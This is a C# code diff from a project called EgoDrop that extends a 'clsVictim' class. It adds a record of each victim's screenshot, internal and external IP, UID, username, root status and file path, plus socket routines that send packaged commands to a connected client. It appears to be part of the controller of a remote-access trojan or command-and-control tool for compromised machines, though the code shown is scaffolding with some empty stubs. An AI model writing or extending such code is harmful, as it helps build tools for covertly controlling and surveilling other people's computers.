@@ -11,6 +11,18 @@ namespace EgoDrop
 {
     public class clsVictim
     {
+        public struct stVictimConfig
+        {
+            public Image imgScreen;
+            public string szID;
+            public string szIpAddrInternal;
+            public string szIpAddrExternal;
+            public uint nUid;
+            public string szUsername;
+            public bool bIsRoot { get { return nUid == 0; } }
+            public string szFilePath;
+        }
+
         public Socket m_sktClnt { get; set; }
         public IWebSocketConnection m_sktConn { get; set; }
 
@@ -34,19 +46,32 @@ namespace EgoDrop
             m_crypto = new clsCrypto(true);
         }
 
-        public void fnSendRaw()
+        public void fnSend(uint nCommand, uint nParam, string szMsg) => fnSend(nCommand, nParam, Encoding.UTF8.GetBytes(szMsg));
+        public void fnSend(uint nCommand, uint nParam, byte[] abMsg) => fnSendRaw(new clsEDP((byte)nCommand, (byte)nParam, abMsg).fnabGetBytes());
+        public void fnSendRaw(byte[] abBuffer)
+        {
+            m_sktClnt.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+            {
+                try
+                {
+                    m_sktClnt.EndSend(ar);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+            }), abBuffer);
+        }
+
+        public void fnSendEncryptedCommand(uint nCommand, uint nParam, byte[] abMsg)
         {
 
         }
 
-        public void fnSendEnc()
+        public void fnSendCmdParam(uint nCmd, uint nParam)
         {
-
-        }
-
-        public void fnSendCmdParam(int nCmd, int nParam)
-        {
-
+            clsEDP edp = new clsEDP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(clsEZData.fnGenerateRandomStr()));
+            fnSendRaw(edp.fnabGetBytes());
         }
 
         public void fnSendCommand()
